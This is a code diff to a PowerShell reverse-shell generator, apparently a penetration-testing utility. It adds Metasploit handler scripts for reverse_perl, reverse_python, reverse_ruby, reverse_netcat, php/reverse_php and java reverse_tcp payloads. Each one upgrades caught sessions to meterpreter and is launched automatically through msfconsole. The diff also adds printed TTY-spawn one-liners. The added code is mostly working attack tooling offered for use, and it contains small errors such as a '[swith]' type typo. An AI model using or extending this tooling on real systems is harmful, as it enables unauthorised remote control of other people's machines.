@@ -1,8 +1,100 @@
 ﻿param(
-[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$python,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm
+[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$python,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[swith]$metasploit
 
 )
 
+$metasploit_perl = @"
+use exploit/multi/handler
+set payload cmd/unix/reverse_perl
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
+
+$metasploit_python = @"
+use exploit/multi/handler
+set payload cmd/unix/reverse_python
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
+
+
+$metasploit_ruby = @"
+use exploit/multi/handler
+set payload cmd/unix/reverse_ruby
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
+
+
+$metasploit_java = @"
+use exploit/multi/handler
+set payload java/shell/reverse_tcp
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
+
+$metasploit_bash = @"
+use exploit/multi/handler
+set payload cmd/unix/reverse_netcat
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
+
+$metasploit_xterm = @"
+use exploit/multi/handler
+set payload cmd/unix/generic
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
+
+$metasploit_php = @"
+use exploit/multi/handler
+set payload php/reverse_php
+set LHOST $Lhost
+set LPORT $Lport
+set ExitOnSession false
+exploit -j -z
+background
+use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit -j -z
+"@
 
 $banner1 = @"
 
@@ -67,8 +159,13 @@ if ($xterm -eq $true) {$r_xterm = $r_xterm   -replace " ","%20" -replace "$", "%
 
 ################################################################################ Spawn tty shell ################################################################################
 
-if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n`n " -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
+if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
+if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
+if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
+if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }
 
+
+################################################################################ Metasploit ################################################################################
 
 
 }
@@ -96,9 +193,15 @@ if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-
 if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }
 
 
+################################################################################ Metasploit ################################################################################
 
-
-
+if ($python -eq $true -and $metasploit -eq $true) {$metasploit_python | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($bash -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($perl -eq $true -and $metasploit -eq $true) {$metasploit_perl | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 
 }
 
